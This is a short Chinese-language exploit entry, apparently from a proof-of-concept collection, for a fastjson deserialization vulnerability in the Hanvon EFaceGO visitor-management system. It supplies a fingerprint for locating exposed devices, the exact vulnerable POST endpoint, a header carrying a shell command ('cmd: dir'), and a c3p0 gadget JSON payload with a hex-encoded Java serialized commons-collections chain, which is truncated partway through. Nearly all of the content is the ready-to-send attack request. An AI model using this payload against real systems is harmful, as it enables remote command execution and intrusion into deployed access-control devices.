# 汉王EFaceGOaddVisitDeviceAppointmentInfoTestfastjson反序列化漏洞

- **系统**：汉王EFaceGOaddVisitDeviceAppointmentInfoTestfa　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`icon_hash="1380907357"`
- **请求**：`POST /manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=SGUsqvF7cVS HTTP/1.1`
- **关键头**：`cmd: dir`　`Content-Type: application/json`　`Cookie: JSESSIONID=813E38790B66C7864D811BDFFA0F1BC8`

**请求体 / payload**
```
{"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656…（脚本共 8925 字，完整版见原文）
```
- **预期**：200　|　—